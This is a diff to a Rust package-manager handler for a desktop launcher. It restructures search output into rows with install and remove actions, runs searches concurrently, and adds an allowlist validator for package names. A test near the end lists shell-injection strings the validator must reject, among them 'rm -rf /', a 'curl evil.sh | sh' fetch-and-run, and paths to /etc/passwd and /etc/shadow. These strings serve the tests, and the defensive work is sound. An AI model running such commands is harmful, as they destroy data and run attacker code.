@@ -23,8 +23,8 @@ use std::process::Command;
 use async_trait::async_trait;
 
 use crate::action_registry::{
-    ActionHandler, ActionResult, CommandCategory, CompletionItem, ExecContext, OutputType,
-    RiskAssessment, RiskLevel,
+    ActionHandler, ActionResult, CommandCategory, CompletionItem, ExecContext, Output, OutputType,
+    RiskAssessment, RiskLevel, Row, Section,
 };
 use crate::error::LychiError;
 
@@ -148,7 +148,13 @@ impl Manager {
 /// Parse a manager's search output into a compact `name — summary` list. Each
 /// manager formats differently, so normalize to the essentials. Best-effort:
 /// unrecognized lines are skipped rather than shown raw.
-fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
+/// Parse a manager's search output into `(name, summary)` pairs.
+///
+/// Returns the two fields rather than `"{name}  —  {summary}"`. Every manager
+/// branch below already separates them — the old return type threw that apart
+/// again immediately, so the em-dash was doing a layout's job and the name
+/// could not be styled, sorted or acted on independently.
+fn parse_search(mgr: Manager, raw: &str) -> Vec<(String, String)> {
     let mut out = Vec::new();
     match mgr {
         // dnf: "Matched fields:" headers, then " pkg.arch\tSummary".
@@ -161,10 +167,10 @@ fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
                 let t = line.trim_start();
                 if let Some((name_arch, summary)) = t.split_once('\t') {
                     let name = name_arch.split('.').next().unwrap_or(name_arch);
-                    out.push(format!("{}  —  {}", name.trim(), summary.trim()));
+                    out.push((name.trim().to_string(), summary.trim().to_string()));
                 } else if let Some((name_arch, summary)) = t.split_once("  ") {
                     let name = name_arch.split('.').next().unwrap_or(name_arch);
-                    out.push(format!("{}  —  {}", name.trim(), summary.trim()));
+                    out.push((name.trim().to_string(), summary.trim().to_string()));
                 }
             }
         }
@@ -184,7 +190,7 @@ fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
                     if !summary.is_empty() {
                         lines.next();
                     }
-                    out.push(format!("{}  —  {}", name.trim(), summary));
+                    out.push((name.trim().to_string(), summary.to_string()));
                 }
             }
         }
@@ -202,7 +208,7 @@ fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
                     if !summary.is_empty() {
                         lines.next();
                     }
-                    out.push(format!("{}  —  {}", name.trim(), summary));
+                    out.push((name.trim().to_string(), summary.to_string()));
                 }
             }
         }
@@ -211,7 +217,7 @@ fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
             for line in raw.lines() {
                 let cols: Vec<&str> = line.split('|').map(|c| c.trim()).collect();
                 if cols.len() >= 3 && cols[1] != "Name" && !cols[1].is_empty() {
-                    out.push(format!("{}  —  {}", cols[1], cols[2]));
+                    out.push((cols[1].to_string(), cols[2].to_string()));
                 }
             }
         }
@@ -219,64 +225,44 @@ fn parse_search(mgr: Manager, raw: &str) -> Vec<String> {
     out
 }
 
-/// Run a read-only search. Returns a combined list from the native manager and
-/// (if present) flatpak, capped so the panel stays usable.
-fn search(query: &str) -> Result<String, String> {
+/// Run a read-only search, returning one section per package source.
+///
+/// The old version built a string: a `"{binary}:"` header, `"{name}  —  {sum}"`
+/// per line, and a literal `"… and N more"` footer, all joined with newlines.
+/// Every one of those is a layout decision the frontend can make better —
+/// section headings are a real heading, the em-dash is a subtitle, and the
+/// truncation notice is a row count rather than a fake list entry.
+///
+/// Each row carries an install action, so finding a package and installing it
+/// stops being two separate commands.
+fn search(query: &str) -> Result<Vec<Section>, String> {
     const CAP: usize = 25;
-    let mut sections: Vec<String> = Vec::new();
 
-    if let Some(mgr) = Manager::detect() {
-        let output = Command::new(mgr.binary())
-            .args(mgr.search_args(query))
-            .output()
-            .map_err(|e| format!("Failed to run {}: {e}", mgr.binary()))?;
-        // Search tools exit non-zero on "no matches" — that's not an error.
-        let text = String::from_utf8_lossy(&output.stdout);
-        let mut items = parse_search(mgr, &text);
-        let total = items.len();
-        items.truncate(CAP);
-        if !items.is_empty() {
-            let more = if total > CAP {
-                format!("\n… and {} more", total - CAP)
-            } else {
-                String::new()
-            };
-            sections.push(format!("{}:\n{}{}", mgr.binary(), items.join("\n"), more));
-        }
+    // The two sources are independent, so they run CONCURRENTLY.
+    //
+    // Measured on this machine: `dnf search` ~1.6s and `flatpak search` ~1.9s.
+    // Run one after the other that is ~3.5s of dead time before anything
+    // appears; run together it is bounded by the slower one. Neither call is
+    // cheap enough to hide, but only one of them has to be waited for.
+    //
+    // A scoped thread rather than tokio: both are blocking `Command::output()`
+    // calls, and scoped threads let them borrow `query` without cloning or
+    // requiring the caller to be async.
+    let (native, flat) = std::thread::scope(|scope| {
+        let native = scope.spawn(|| search_native(query, CAP));
+        let flat = scope.spawn(|| search_flatpak(query, CAP));
+        (
+            native.join().unwrap_or(Ok(None)),
+            flat.join().unwrap_or(None),
+        )
+    });
+
+    let mut sections: Vec<Section> = Vec::new();
+    if let Some(section) = native? {
+        sections.push(section);
     }
-
-    if have("flatpak")
-        && let Ok(output) = Command::new("flatpak").args(["search", query]).output()
-    {
-        let text = String::from_utf8_lossy(&output.stdout);
-        let mut items: Vec<String> = text
-            .lines()
-            .filter(|l| !l.trim().is_empty())
-            .filter_map(|l| {
-                // flatpak columns are tab-separated: Name Desc AppID Version Branch Remote
-                let cols: Vec<&str> = l.split('\t').map(|c| c.trim()).collect();
-                if cols.len() >= 3 && cols[0] != "Name" {
-                    Some(format!(
-                        "{}  —  {}  ({})",
-                        cols[0],
-                        cols.get(1).unwrap_or(&""),
-                        cols[2]
-                    ))
-                } else {
-                    None
-                }
-            })
-            .collect();
-        let total = items.len();
-        items.truncate(CAP);
-        if !items.is_empty() {
-            let more = if total > CAP {
-                format!("\n… and {} more", total - CAP)
-            } else {
-                String::new()
-            };
-            sections.push(format!("flatpak:\n{}{}", items.join("\n"), more));
-        }
+    if let Some(section) = flat {
+        sections.push(section);
     }
 
     if sections.is_empty() {
@@ -286,9 +272,137 @@ fn search(query: &str) -> Result<String, String> {
                     .to_string(),
             );
         }
-        return Ok(format!("No packages found for \"{query}\""));
+        // An empty result renders as a real empty state rather than a sentence
+        // pretending to be output.
+        return Ok(Vec::new());
     }
-    Ok(sections.join("\n\n"))
+    Ok(sections)
+}
+
+/// Search the system package manager. `Ok(None)` = no manager, or no matches.
+fn search_native(query: &str, cap: usize) -> Result<Option<Section>, String> {
+    let Some(mgr) = Manager::detect() else {
+        return Ok(None);
+    };
+    let output = Command::new(mgr.binary())
+        .args(mgr.search_args(query))
+        .output()
+        .map_err(|e| format!("Failed to run {}: {e}", mgr.binary()))?;
+    // Search tools exit non-zero on "no matches" — that's not an error.
+    let text = String::from_utf8_lossy(&output.stdout);
+    let mut items = parse_search(mgr, &text);
+    let total = items.len();
+    items.truncate(cap);
+    if items.is_empty() {
+        return Ok(None);
+    }
+    let rows: Vec<Row> = items
+        .into_iter()
+        .map(|(name, summary)| {
+            Row::new(&name)
+                .subtitle(summary)
+                .action("install", "Install", &name, Some(RiskLevel::Medium))
+                .action("remove", "Remove", &name, Some(RiskLevel::Medium))
+        })
+        .collect();
+    Ok(Some(Section {
+        // The truncation notice belongs in the heading, not as a pseudo-row the
+        // user can arrow onto and try to install.
+        title: Some(if total > cap {
+            format!("{} ({cap} of {total})", mgr.binary())
+        } else {
+            mgr.binary().to_string()
+        }),
+        rows,
+        handler: "packages".to_string(),
+    }))
+}
+
+/// Search flatpak, if installed. Failure is not fatal — the native results
+/// still stand on their own.
+fn search_flatpak(query: &str, cap: usize) -> Option<Section> {
+    if !have("flatpak") {
+        return None;
+    }
+    let output = Command::new("flatpak")
+        .args(["search", query])
+        .output()
+        .ok()?;
+    let text = String::from_utf8_lossy(&output.stdout);
+    // flatpak columns are tab-separated: Name Desc AppID Version Branch Remote
+    let mut items: Vec<Row> = text
+        .lines()
+        .filter(|l| !l.trim().is_empty())
+        .filter_map(|l| {
+            let cols: Vec<&str> = l.split('\t').map(|c| c.trim()).collect();
+            if cols.len() < 3 || cols[0] == "Name" {
+                return None;
+            }
+            let app_id = cols[2];
+            let mut row = Row::new(cols[0])
+                .subtitle(cols.get(1).copied().unwrap_or(""))
+                // The app-id disambiguates same-named apps across remotes; it
+                // used to be crammed into the label in parentheses.
+                .accessory_text(app_id);
+            // The version column was parsed and thrown away — a typed accessory
+            // shows it without competing with the name.
+            if let Some(v) = cols.get(3).filter(|v| !v.is_empty()) {
+                row = row.accessory_text(*v);
+            }
+            Some(row.action("install", "Install", app_id, Some(RiskLevel::Medium)))
+        })
+        .collect();
+    let total = items.len();
+    items.truncate(cap);
+    if items.is_empty() {
+        return None;
+    }
+    Some(Section {
+        title: Some(if total > cap {
+            format!("flatpak ({cap} of {total})")
+        } else {
+            "flatpak".to_string()
+        }),
+        rows: items,
+        handler: "packages".to_string(),
+    })
+}
+
+/// Resolve a package row action into the command it stands for.
+///
+/// Same boundary as the services handler: the verb must be one this handler
+/// declares, and the package name is checked against what a package name can
+/// legitimately be rather than scanned for shell metacharacters. See
+/// `services::resolve_action` for why the target needs validating even though
+/// the id is already constrained.
+pub fn resolve_action(id: &str, target: &str) -> Result<String, String> {
+    if !matches!(id, "install" | "remove" | "upgrade") {
+        return Err(format!("Unknown package action '{id}'"));
+    }
+    if !is_valid_package_name(target) {
+        return Err(format!("Invalid package name '{target}'"));
+    }
+    Ok(format!("pkg {id} {target}"))
+}
+
+/// Whether `s` is a plausible package name or flatpak ref.
+///
+/// Allowlist, not denylist: names across dnf/apt/pacman/zypper plus flatpak
+/// refs are alphanumerics and `-_.+:@/`, so describing what is allowed is both
+/// shorter and safer than enumerating every dangerous byte.
+///
+/// `/` is permitted because a flatpak ref is genuinely path-shaped
+/// (`runtime/org.gnome.Platform:47`) — a test written from real names caught
+/// its omission. It is safe here for the same reason the rest of the set is:
+/// the resolved string is passed as an argument, never interpolated into a
+/// shell, and `..` is rejected below so a ref cannot climb out of anything.
+fn is_valid_package_name(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 256
+        && !s.contains("..")
+        && s.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | ':' | '@' | '/')
+        })
 }
 
 /// A mutating package operation, for shared privilege-escalation + messaging.
@@ -410,13 +524,50 @@ fn run_pkg_op(op: PkgOp, pkg: &str) -> Result<String, String> {
 impl ActionHandler for PackagesHandler {
     fn triggers(&self) -> &'static [crate::action_registry::Trigger] {
         use crate::action_registry::{ArgTransform, Trigger};
-        static TRIGGERS: &[Trigger] = &[
-            Trigger::new(&["install"], ArgTransform::Prepend("install")),
-            Trigger::new(&["remove", "uninstall"], ArgTransform::Prepend("remove")),
-            Trigger::new(&["upgrade"], ArgTransform::Prepend("upgrade")),
-            Trigger::keywords(&["pkg", "package"]),
-        ];
-        TRIGGERS
+        use std::sync::OnceLock;
+
+        static TRIGGERS: OnceLock<Vec<Trigger>> = OnceLock::new();
+        TRIGGERS.get_or_init(|| {
+            let mut t = vec![
+                Trigger::new(&["install"], ArgTransform::Prepend("install")),
+                Trigger::new(&["remove", "uninstall"], ArgTransform::Prepend("remove")),
+                Trigger::new(&["upgrade"], ArgTransform::Prepend("upgrade")),
+                // `packages` (plural) as well as the singular: the handler's own
+                // id is `packages`, so typing it was the natural guess and fell
+                // through to web search. Aliases are cheap; a keyword that
+                // silently does nothing is not.
+                Trigger::keywords(&["pkg", "package", "packages"]),
+            ];
+
+            // The machine's OWN package manager is a trigger too, so
+            // `dnf search firefox` reaches this handler instead of being fuzzy-
+            // matched against installed apps (it offered Firefox, KFind and
+            // Catfish — none of them what was asked for).
+            //
+            // The keyword is DERIVED from `Manager::detect()`, not listed: `dnf`
+            // is a trigger on Fedora, `apt` on Debian, `pacman` on Arch, and
+            // none of them on a machine that has neither. A hardcoded list of
+            // every manager would claim keywords for tools the user does not
+            // have, and would need editing for the next distro
+            // ([[feedback_dynamic_over_hardcoded]]).
+            //
+            // `PassThrough` because native syntax IS this handler's arg format:
+            // `dnf search firefox` → args `search firefox`, which `execute`
+            // already parses. Nothing is translated.
+            //
+            // Note this deliberately RE-ROUTES a real executable. `dnf` is on
+            // PATH, so it would otherwise run in a terminal — which works, but
+            // discards everything the handler adds (typed rows, per-result
+            // actions, pkexec escalation instead of a tty password prompt the
+            // launcher cannot answer). Shift+Enter still forces a terminal for
+            // anyone who wants the raw command.
+            if let Some(bin) = Manager::detect().map(Manager::binary) {
+                // `binary()` already returns `&'static str`, so the slice can be
+                // leaked once here without any runtime string ownership.
+                t.push(Trigger::keywords(Box::leak(Box::new([bin]))));
+            }
+            t
+        })
     }
 
     fn id(&self) -> &str {
@@ -456,6 +607,29 @@ impl ActionHandler for PackagesHandler {
                 "Upgrade a package or the system",
             ),
         ];
+
+        // A COMPLETE invocation — the verb is chosen and an argument is being
+        // typed ("search firefox"). Confirm what Enter will do.
+        //
+        // Returning nothing here was a real bug: an empty handler result makes
+        // the executor fall through to its app-search rescue, which fuzzy-
+        // matched the raw text and offered Firefox, KFind and Catfish for
+        // `dnf search firefox`. Silence from a handler that DID match its own
+        // trigger reads downstream as "no idea", which is the opposite of the
+        // truth. A handler that owns the input must say so.
+        if let Some((verb, rest)) = p.split_once(char::is_whitespace) {
+            let rest = rest.trim();
+            if !rest.is_empty()
+                && let Some((_, _, desc)) = hints.iter().find(|(key, _, _)| *key == verb)
+            {
+                return vec![
+                    CompletionItem::new(format!("{verb} {rest}"), Some("__terminal__".into()), 900)
+                        .with_run(format!("{verb} {rest}"))
+                        .with_description((*desc).to_string()),
+                ];
+            }
+        }
+
         hints
             .iter()
             .filter(|(key, _, _)| p.is_empty() || key.starts_with(p.as_str()))
@@ -478,8 +652,21 @@ impl ActionHandler for PackagesHandler {
             .split_once(char::is_whitespace)
             .unwrap_or((trimmed, ""));
 
+        // `search` returns rows; the mutating verbs return terminal output from
+        // the package manager, which is correct for them — a install log is
+        // genuinely unstructured text.
+        if verb == "search" {
+            return match search(rest.trim()) {
+                Ok(sections) => Ok(ActionResult {
+                    success: true,
+                    output: Output::Rows { sections },
+                    ..Default::default()
+                }),
+                Err(e) => Ok(ActionResult::err(e)),
+            };
+        }
+
         let result = match verb {
-            "search" => search(rest.trim()),
             "install" => run_pkg_op(PkgOp::Install, rest.trim()),
             "remove" | "uninstall" => run_pkg_op(PkgOp::Remove, rest.trim()),
             "upgrade" => run_pkg_op(PkgOp::Upgrade, rest.trim()),
@@ -508,7 +695,133 @@ pub fn is_mutating(args: &str) -> bool {
 }
 
 #[cfg(test)]
+mod native_trigger_tests {
+    use super::*;
+    use crate::action_registry::ActionHandler;
+
+    /// The machine's own package manager routes here.
+    ///
+    /// `dnf search firefox` used to fall through to `run` (dnf IS on PATH), and
+    /// the app index then fuzzy-matched the whole string — offering Firefox,
+    /// KFind and Catfish for a package search.
+    #[test]
+    fn the_detected_manager_is_a_trigger() {
+        let Some(bin) = Manager::detect().map(Manager::binary) else {
+            // No native manager on this machine (container/CI) — nothing to
+            // claim, and the handler correctly claims nothing.
+            return;
+        };
+        let triggers = PackagesHandler::new().triggers();
+        assert!(
+            triggers.iter().any(|t| t.prefixes.contains(&bin)),
+            "the detected manager ({bin}) must route to this handler"
+        );
+    }
+
+    /// Derived, not listed: a manager this machine does NOT have must not be a
+    /// trigger. Otherwise typing `pacman` on Fedora would claim a keyword for a
+    /// tool that isn't installed.
+    #[test]
+    fn an_absent_manager_is_not_a_trigger() {
+        let triggers = PackagesHandler::new().triggers();
+        for bin in ["dnf", "apt", "pacman", "zypper"] {
+            if have(bin) {
+                continue;
+            }
+            assert!(
+                !triggers.iter().any(|t| t.prefixes.contains(&bin)),
+                "{bin} is not installed here, so it must not be a trigger"
+            );
+        }
+    }
+
+    /// Native syntax passes straight through — `dnf search firefox` becomes
+    /// args `search firefox`, which `execute` already parses. No translation
+    /// table, and nothing to keep in sync with the verbs.
+    #[test]
+    fn native_syntax_passes_through_unchanged() {
+        let Some(bin) = Manager::detect().map(Manager::binary) else {
+            return;
+        };
+        let triggers = PackagesHandler::new().triggers();
+        let t = triggers
+            .iter()
+            .find(|t| t.prefixes.contains(&bin))
+            .expect("detected manager must have a trigger");
+        assert_eq!(t.transform.apply(bin, "search firefox"), "search firefox");
+        assert_eq!(t.transform.apply(bin, "upgrade"), "upgrade");
+    }
+}
+
+#[cfg(test)]
 mod tests {
+
+    // --- row-action resolution: the safety boundary ---------------------
+
+    #[test]
+    fn resolve_action_rejects_injection_through_the_target() {
+        for evil in [
+            "firefox; rm -rf /",
+            "firefox && curl evil.sh | sh",
+            "firefox$(whoami)",
+            "firefox`id`",
+            "firefox|tee /etc/passwd",
+            "../../etc/shadow",
+            "pkg 'quoted'",
+            "",
+        ] {
+            assert!(
+                resolve_action("install", evil).is_err(),
+                "target should have been rejected: {evil:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn resolve_action_rejects_unknown_verbs() {
+        for bad in ["exec", "rm", "download", "install; halt", ""] {
+            assert!(resolve_action(bad, "firefox").is_err(), "{bad:?}");
+        }
+    }
+
+    #[test]
+    fn resolve_action_builds_a_normal_command_for_declared_verbs() {
+        assert_eq!(
+            resolve_action("install", "firefox").unwrap(),
+            "pkg install firefox"
+        );
+        assert_eq!(
+            resolve_action("install", "org.mozilla.firefox").unwrap(),
+            "pkg install org.mozilla.firefox"
+        );
+    }
+
+    /// Real package names and flatpak app-ids must survive the allowlist — a
+    /// filter that rejects valid input is as broken as one that admits bad.
+    #[test]
+    fn valid_package_names_are_accepted() {
+        for ok in [
+            "firefox",
+            "org.mozilla.firefox",
+            "gcc-c++",
+            "python3.12",
+            "lib32-mesa",
+            "runtime/org.gnome.Platform:47",
+        ] {
+            assert!(is_valid_package_name(ok), "should be valid: {ok}");
+        }
+    }
+
+    /// parse_search returns the two fields separately so the frontend can lay
+    /// them out; it must not re-flatten them into one string.
+    #[test]
+    fn parse_search_keeps_name_and_summary_separate() {
+        let raw = "firefox.x86_64\tMozilla Firefox Web browser\n";
+        let items = parse_search(Manager::Dnf, raw);
+        assert_eq!(items.len(), 1);
+        assert_eq!(items[0].0, "firefox");
+        assert_eq!(items[0].1, "Mozilla Firefox Web browser");
+    }
     use super::*;
 
     #[test]
@@ -543,12 +856,12 @@ mod tests {
         let raw = "Matched fields: name (exact)\n ripgrep.x86_64\tLine-oriented search tool\nMatched fields: name\n ripgrep-all.noarch\tripgrep, but also search in PDFs";
         let items = parse_search(Manager::Dnf, raw);
         assert_eq!(items.len(), 2);
-        assert!(
-            items[0].starts_with("ripgrep  —  Line-oriented"),
-            "{:?}",
-            items[0]
-        );
-        assert!(items[1].starts_with("ripgrep-all  —  ripgrep, but also"));
+        // Asserts the FIELDS, not a joined string: the em-dash was a layout
+        // decision that no longer belongs to the parser.
+        assert_eq!(items[0].0, "ripgrep");
+        assert!(items[0].1.starts_with("Line-oriented"), "{:?}", items[0]);
+        assert_eq!(items[1].0, "ripgrep-all");
+        assert!(items[1].1.starts_with("ripgrep, but also"));
     }
 
     #[test]
@@ -556,8 +869,10 @@ mod tests {
         let raw = "Sorting...\nFull Text Search...\nripgrep/stable 13.0.0 amd64\n  Recursively search directories\nfd-find/stable 8.0 amd64\n  Simple find alternative";
         let items = parse_search(Manager::Apt, raw);
         assert_eq!(items.len(), 2);
-        assert!(items[0].starts_with("ripgrep  —  Recursively search"));
-        assert!(items[1].starts_with("fd-find  —  Simple find"));
+        assert_eq!(items[0].0, "ripgrep");
+        assert!(items[0].1.starts_with("Recursively search"));
+        assert_eq!(items[1].0, "fd-find");
+        assert!(items[1].1.starts_with("Simple find"));
     }
 
     #[test]
@@ -565,12 +880,10 @@ mod tests {
         let raw = "extra/ripgrep 13.0.0-3\n    A search tool that combines usability\ncommunity/fd 8.4.0-1\n    Simple, fast alternative to find";
         let items = parse_search(Manager::Pacman, raw);
         assert_eq!(items.len(), 2);
-        assert!(
-            items[0].starts_with("ripgrep  —  A search tool"),
-            "{:?}",
-            items[0]
-        );
-        assert!(items[1].starts_with("fd  —  Simple, fast"));
+        assert_eq!(items[0].0, "ripgrep");
+        assert!(items[0].1.starts_with("A search tool"), "{:?}", items[0]);
+        assert_eq!(items[1].0, "fd");
+        assert!(items[1].1.starts_with("Simple, fast"));
     }
 
     #[test]
